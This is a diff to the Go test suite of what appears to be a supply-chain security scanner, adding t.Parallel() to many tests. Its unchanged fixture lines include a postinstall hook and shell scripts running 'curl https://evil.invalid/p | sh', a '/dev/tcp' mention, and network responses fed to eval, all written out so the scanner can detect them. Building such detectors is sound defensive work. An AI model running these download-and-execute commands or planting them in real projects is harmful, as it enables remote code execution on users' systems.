@@ -48,6 +48,7 @@ func ruleFinding(findings []model.Finding, id string) (model.Finding, bool) {
 }
 
 func TestDetectsDownloadExecuteAndLifecycle(t *testing.T) {
+	t.Parallel()
 	root := t.TempDir()
 	writeFixture(t, root, "package.json", `{"scripts":{"postinstall":"curl https://evil.invalid/p | sh"}}`)
 	coverage, findings := New(Options{}).Scan(context.Background(), root)
@@ -62,6 +63,7 @@ func TestDetectsDownloadExecuteAndLifecycle(t *testing.T) {
 }
 
 func TestCleanRepositoryHasNoFindings(t *testing.T) {
+	t.Parallel()
 	root := t.TempDir()
 	writeFixture(t, root, "main.go", "package main\n\nfunc main() {}\n")
 	writeFixture(t, root, "README.md", "# Small example\nThis project prints a greeting.\n")
@@ -76,6 +78,7 @@ func TestCleanRepositoryHasNoFindings(t *testing.T) {
 }
 
 func TestDisabledGitHooksAreNotFlagged(t *testing.T) {
+	t.Parallel()
 	root := t.TempDir()
 	writeFixture(t, root, ".git/config", "[core]\n\thooksPath = /dev/null\n")
 	_, findings := New(Options{}).Scan(context.Background(), root)
@@ -85,6 +88,7 @@ func TestDisabledGitHooksAreNotFlagged(t *testing.T) {
 }
 
 func TestDocumentationExamplesDoNotProduceCriticalFindings(t *testing.T) {
+	t.Parallel()
 	root := t.TempDir()
 	writeFixture(t, root, "LICENSE", "test fixture license\n")
 	writeFixture(t, root, "README.md", "Security docs: never run `curl https://evil.invalid/p | sh` or use `/dev/tcp/host/1`.\n")
@@ -104,6 +108,7 @@ func TestDocumentationExamplesDoNotProduceCriticalFindings(t *testing.T) {
 }
 
 func TestSignatureCorpusIsAggregatedAndDowngraded(t *testing.T) {
+	t.Parallel()
 	root := t.TempDir()
 	writeFixture(t, root, "README.md", "fixture\n")
 	writeFixture(t, root, "LICENSE", "fixture\n")
@@ -129,6 +134,7 @@ func TestSignatureCorpusIsAggregatedAndDowngraded(t *testing.T) {
 }
 
 func TestScannerImplementationPatternsAreDowngraded(t *testing.T) {
+	t.Parallel()
 	root := t.TempDir()
 	writeFixture(t, root, "README.md", "fixture\n")
 	writeFixture(t, root, "LICENSE", "fixture\n")
@@ -152,6 +158,7 @@ func signatures() {
 }
 
 func TestRepositoryHygieneIsInformational(t *testing.T) {
+	t.Parallel()
 	root := t.TempDir()
 	writeFixture(t, root, "main.go", "package main\n")
 	_, findings := New(Options{}).Scan(context.Background(), root)
@@ -163,6 +170,7 @@ func TestRepositoryHygieneIsInformational(t *testing.T) {
 }
 
 func TestDetectsExfiltrationAndBackdoorSignals(t *testing.T) {
+	t.Parallel()
 	root := t.TempDir()
 	writeFixture(t, root, "README.md", "fixture\n")
 	writeFixture(t, root, "LICENSE", "fixture\n")
@@ -176,6 +184,7 @@ func TestDetectsExfiltrationAndBackdoorSignals(t *testing.T) {
 }
 
 func TestDetectsConfirmedPackageNamesAcrossEcosystems(t *testing.T) {
+	t.Parallel()
 	root := t.TempDir()
 	writeFixture(t, root, "README.md", "fixture\n")
 	writeFixture(t, root, "LICENSE", "fixture\n")
@@ -198,6 +207,7 @@ func TestDetectsConfirmedPackageNamesAcrossEcosystems(t *testing.T) {
 }
 
 func TestKnownBenignPackageIsNotBlocklisted(t *testing.T) {
+	t.Parallel()
 	root := t.TempDir()
 	writeFixture(t, root, "README.md", "fixture\n")
 	writeFixture(t, root, "LICENSE", "fixture\n")
@@ -211,6 +221,7 @@ func TestKnownBenignPackageIsNotBlocklisted(t *testing.T) {
 }
 
 func TestAdvisoryVersionsDistinguishResolvedFromPossible(t *testing.T) {
+	t.Parallel()
 	root := t.TempDir()
 	writeFixture(t, root, "README.md", "fixture\n")
 	writeFixture(t, root, "LICENSE", "fixture\n")
@@ -245,6 +256,7 @@ func TestAdvisoryVersionsDistinguishResolvedFromPossible(t *testing.T) {
 }
 
 func TestAxiosExactLockfileVersions(t *testing.T) {
+	t.Parallel()
 	for _, item := range []struct {
 		version  string
 		affected bool
@@ -274,6 +286,7 @@ func TestAxiosExactLockfileVersions(t *testing.T) {
 }
 
 func TestAxiosResponseExecutionFlowAndBenignControls(t *testing.T) {
+	t.Parallel()
 	root := t.TempDir()
 	writeFixture(t, root, "README.md", "fixture\n")
 	writeFixture(t, root, "LICENSE", "fixture\n")
@@ -343,6 +356,7 @@ async function parse() {
 }
 
 func TestTopLevelModuleAxiosFlow(t *testing.T) {
+	t.Parallel()
 	root := t.TempDir()
 	writeFixture(t, root, "module.mjs", "const response = await axios.get('https://example.invalid/data');\neval(response.data);\n")
 	writeFixture(t, root, "ordinary.mjs", "const response = await axios.get('https://example.invalid/data');\nconsole.log(response.data);\nfunction unrelated() { eval(localExpression); }\n")
@@ -366,6 +380,7 @@ func TestTopLevelModuleAxiosFlow(t *testing.T) {
 }
 
 func TestLiteralDecodeRetainsSourceLocation(t *testing.T) {
+	t.Parallel()
 	root := t.TempDir()
 	writeFixture(t, root, "README.md", "fixture\n")
 	writeFixture(t, root, "LICENSE", "fixture\n")
@@ -407,6 +422,7 @@ func TestLiteralDecodeRetainsSourceLocation(t *testing.T) {
 }
 
 func TestUnsupportedLiteralDecodeMarksCoverageIncomplete(t *testing.T) {
+	t.Parallel()
 	for _, test := range []struct {
 		name, source, reason string
 	}{
@@ -432,6 +448,7 @@ func TestUnsupportedLiteralDecodeMarksCoverageIncomplete(t *testing.T) {
 }
 
 func TestVendorBundleWeakNoiseAndStrongSignals(t *testing.T) {
+	t.Parallel()
 	root := t.TempDir()
 	writeFixture(t, root, "README.md", "fixture\n")
 	writeFixture(t, root, "LICENSE", "fixture\n")
@@ -449,6 +466,7 @@ func TestVendorBundleWeakNoiseAndStrongSignals(t *testing.T) {
 	}
 }
 func TestEvidenceRedactsCredentials(t *testing.T) {
+	t.Parallel()
 	root := t.TempDir()
 	providerCredential := "AKIA" + "ABCDEFGHIJKLMNOP"
 	writeFixture(t, root, "credentials.txt", providerCredential+"\napi_key=super-secret-value\n")
@@ -464,6 +482,7 @@ func TestEvidenceRedactsCredentials(t *testing.T) {
 }
 
 func TestEscapingSymlink(t *testing.T) {
+	t.Parallel()
 	if runtime.GOOS == "windows" {
 		t.Skip("symlink creation requires privileges")
 	}
@@ -478,6 +497,7 @@ func TestEscapingSymlink(t *testing.T) {
 }
 
 func TestGeneratedCodeSignalsAreDetected(t *testing.T) {
+	t.Parallel()
 	root := t.TempDir()
 	writeFixture(t, root, "packed.js", "eval('x');\n"+strings.Repeat("abcdefghijklmnopqrstuvwxyz0123456789", 20))
 	writeFixture(t, root, "obfuscated.js", "const token = /\\s/; eval(payload);\n")
@@ -517,6 +537,7 @@ func TestGeneratedCodeSignalsAreDetected(t *testing.T) {
 }
 
 func TestDependencyTreesSkippedByDefault(t *testing.T) {
+	t.Parallel()
 	root := t.TempDir()
 	writeFixture(t, root, "README.md", "fixture\n")
 	writeFixture(t, root, "LICENSE", "fixture\n")
@@ -538,6 +559,7 @@ func TestDependencyTreesSkippedByDefault(t *testing.T) {
 }
 
 func TestScanReportsCoverageProgress(t *testing.T) {
+	t.Parallel()
 	root := t.TempDir()
 	writeFixture(t, root, "README.md", "fixture\n")
 	writeFixture(t, root, "main.go", "package main\n")
@@ -551,6 +573,7 @@ func TestScanReportsCoverageProgress(t *testing.T) {
 }
 
 func TestExecutionAndRepositorySurfaceDetections(t *testing.T) {
+	t.Parallel()
 	root := t.TempDir()
 	writeFixture(t, root, "README.md", "fixture\n")
 	writeFixture(t, root, "LICENSE", "fixture\n")
@@ -572,6 +595,7 @@ func TestExecutionAndRepositorySurfaceDetections(t *testing.T) {
 }
 
 func TestPrecisionExclusions(t *testing.T) {
+	t.Parallel()
 	root := t.TempDir()
 	writeFixture(t, root, "README.md", "fixture\n")
 	writeFixture(t, root, "LICENSE", "fixture\n")
@@ -587,6 +611,7 @@ func TestPrecisionExclusions(t *testing.T) {
 }
 
 func TestPublicIPURLIsReported(t *testing.T) {
+	t.Parallel()
 	root := t.TempDir()
 	writeFixture(t, root, "README.md", "fixture\n")
 	writeFixture(t, root, "LICENSE", "fixture\n")
@@ -598,6 +623,7 @@ func TestPublicIPURLIsReported(t *testing.T) {
 }
 
 func TestQualifiedOccurrencesExcludePrivateIPMatches(t *testing.T) {
+	t.Parallel()
 	root := t.TempDir()
 	writeFixture(t, root, "README.md", "fixture\n")
 	writeFixture(t, root, "LICENSE", "fixture\n")
@@ -610,6 +636,7 @@ func TestQualifiedOccurrencesExcludePrivateIPMatches(t *testing.T) {
 }
 
 func TestRuleCatalogEntriesProvideReviewGuidance(t *testing.T) {
+	t.Parallel()
 	catalog := BuiltinRuleCatalog()
 	seen := map[string]bool{}
 	for _, info := range catalog {
@@ -624,6 +651,7 @@ func TestRuleCatalogEntriesProvideReviewGuidance(t *testing.T) {
 }
 
 func TestProcessPrecisionAndCompleteLocations(t *testing.T) {
+	t.Parallel()
 	root := t.TempDir()
 	writeFixture(t, root, "README.md", "fixture\n")
 	writeFixture(t, root, "LICENSE", "fixture\n")
@@ -648,6 +676,7 @@ spawn("node", ["--version"]);
 }
 
 func TestLiteralTypeImportsAreNotDynamicImports(t *testing.T) {
+	t.Parallel()
 	root := t.TempDir()
 	writeFixture(t, root, "README.md", "fixture\n")
 	writeFixture(t, root, "LICENSE", "fixture\n")
@@ -661,6 +690,7 @@ func TestLiteralTypeImportsAreNotDynamicImports(t *testing.T) {
 }
 
 func TestMinifiedAndDistributionOutputUsesGeneratedContext(t *testing.T) {
+	t.Parallel()
 	root := t.TempDir()
 	writeFixture(t, root, "README.md", "fixture\n")
 	writeFixture(t, root, "LICENSE", "fixture\n")
@@ -687,6 +717,7 @@ func TestMinifiedAndDistributionOutputUsesGeneratedContext(t *testing.T) {
 }
 
 func TestGeneratedContextSuppressesWeakNoiseButRetainsSecrets(t *testing.T) {
+	t.Parallel()
 	root := t.TempDir()
 	writeFixture(t, root, "README.md", "fixture\n")
 	writeFixture(t, root, "LICENSE", "fixture\n")
@@ -704,6 +735,7 @@ func TestGeneratedContextSuppressesWeakNoiseButRetainsSecrets(t *testing.T) {
 }
 
 func TestStructuredWorkflowRetainsEveryMutableActionLocation(t *testing.T) {
+	t.Parallel()
 	root := t.TempDir()
 	writeFixture(t, root, "README.md", "fixture\n")
 	writeFixture(t, root, "LICENSE", "fixture\n")
@@ -724,6 +756,7 @@ func TestStructuredWorkflowRetainsEveryMutableActionLocation(t *testing.T) {
 }
 
 func TestLocationDetailLimitKeepsOccurrenceCount(t *testing.T) {
+	t.Parallel()
 	root := t.TempDir()
 	writeFixture(t, root, "README.md", "fixture\n")
 	writeFixture(t, root, "LICENSE", "fixture\n")
@@ -739,6 +772,7 @@ func TestLocationDetailLimitKeepsOccurrenceCount(t *testing.T) {
 }
 
 func TestEvidenceRedactionHandlesSpacesAndUnicode(t *testing.T) {
+	t.Parallel()
 	evidence := safeEvidence([]byte(`const client_secret = "correct horse battery staple 🔐"; ` + strings.Repeat("界", 200)))
 	if strings.Contains(evidence, "correct") || strings.Contains(evidence, "horse") || !strings.Contains(evidence, "client_secret=[REDACTED]") || !utf8.ValidString(evidence) {
 		t.Fatalf("unsafe evidence: %q", evidence)
@@ -746,6 +780,7 @@ func TestEvidenceRedactionHandlesSpacesAndUnicode(t *testing.T) {
 }
 
 func TestLiteralDependentRulesRemainCovered(t *testing.T) {
+	t.Parallel()
 	root := t.TempDir()
 	writeFixture(t, root, "README.md", "fixture\n")
 	writeFixture(t, root, "LICENSE", "fixture\n")
@@ -759,6 +794,7 @@ func TestLiteralDependentRulesRemainCovered(t *testing.T) {
 }
 
 func TestExecutableExamplesInCommentsAreContextual(t *testing.T) {
+	t.Parallel()
 	root := t.TempDir()
 	writeFixture(t, root, "README.md", "fixture\n")
 	writeFixture(t, root, "LICENSE", "fixture\n")
@@ -771,6 +807,7 @@ func TestExecutableExamplesInCommentsAreContextual(t *testing.T) {
 }
 
 func TestStructuredRuleFamilyContract(t *testing.T) {
+	t.Parallel()
 	root := t.TempDir()
 	knownBody := []byte("known indicator fixture")
 	knownHash := sha256.Sum256(knownBody)
@@ -835,6 +872,7 @@ func TestStructuredRuleFamilyContract(t *testing.T) {
 }
 
 func TestCorrelationsRetainOnlyContributingRulesAndLocations(t *testing.T) {
+	t.Parallel()
 	root := t.TempDir()
 	writeFixture(t, root, "README.md", "fixture\n")
 	writeFixture(t, root, "LICENSE", "fixture\n")
@@ -857,6 +895,7 @@ func TestCorrelationsRetainOnlyContributingRulesAndLocations(t *testing.T) {
 }
 
 func TestMultipleMatchesOnOneLineKeepOccurrenceTotal(t *testing.T) {
+	t.Parallel()
 	root := t.TempDir()
 	writeFixture(t, root, "README.md", "fixture\n")
 	writeFixture(t, root, "LICENSE", "fixture\n")
@@ -869,6 +908,7 @@ func TestMultipleMatchesOnOneLineKeepOccurrenceTotal(t *testing.T) {
 }
 
 func TestFindingOrderIsDeterministicAcrossStructuredMaps(t *testing.T) {
+	t.Parallel()
 	root := t.TempDir()
 	writeFixture(t, root, "README.md", "fixture\n")
 	writeFixture(t, root, "LICENSE", "fixture\n")
@@ -894,6 +934,7 @@ func TestFindingOrderIsDeterministicAcrossStructuredMaps(t *testing.T) {
 }
 
 func TestTrustedRegistryRequiresExactHTTPSHost(t *testing.T) {
+	t.Parallel()
 	for _, tc := range []struct {
 		name, path, body, rule string
 		wantFinding            bool
@@ -919,6 +960,7 @@ func TestTrustedRegistryRequiresExactHTTPSHost(t *testing.T) {
 }
 
 func TestUndecodableScriptCannotReportCompleteCoverage(t *testing.T) {
+	t.Parallel()
 	repo := t.TempDir()
 	writeFixture(t, repo, "run.sh", "#!/bin/sh\n#\x00\ncurl https://evil.invalid/p | sh\n")
 	writeFixture(t, repo, "run", "#!/bin/sh\n#\x00\ncurl https://evil.invalid/p | sh\n")
@@ -941,6 +983,7 @@ func TestUndecodableScriptCannotReportCompleteCoverage(t *testing.T) {
 }
 
 func TestExcessiveLineCountMarksRuleCoverageIncomplete(t *testing.T) {
+	t.Parallel()
 	repo := t.TempDir()
 	writeFixture(t, repo, "many.js", strings.Repeat("x\n", 250001))
 	coverage, _ := New(Options{}).Scan(context.Background(), repo)
@@ -951,6 +994,7 @@ func TestExcessiveLineCountMarksRuleCoverageIncomplete(t *testing.T) {
 
 // Fixtures are scanned from temporary directories; none are executed.
 func TestScannerDetectsRiskAcrossSurfaces(t *testing.T) {
+	t.Parallel()
 	cases := []struct {
 		name, path, body string
 		want             []string
@@ -1019,6 +1063,7 @@ func TestScannerDetectsRiskAcrossSurfaces(t *testing.T) {
 }
 
 func TestRasterImageTextIsOutsideTextRuleCoverage(t *testing.T) {
+	t.Parallel()
 	root := t.TempDir()
 	writeFixture(t, root, "README.md", "fixture\n")
 	writeFixture(t, root, "LICENSE", "fixture\n")
@@ -1031,6 +1076,7 @@ func TestRasterImageTextIsOutsideTextRuleCoverage(t *testing.T) {
 }
 
 func TestOctoberPackageIndicators(t *testing.T) {
+	t.Parallel()
 	for _, tc := range []struct {
 		name, path, content, rule, context, message string
 		severity                                    model.Severity
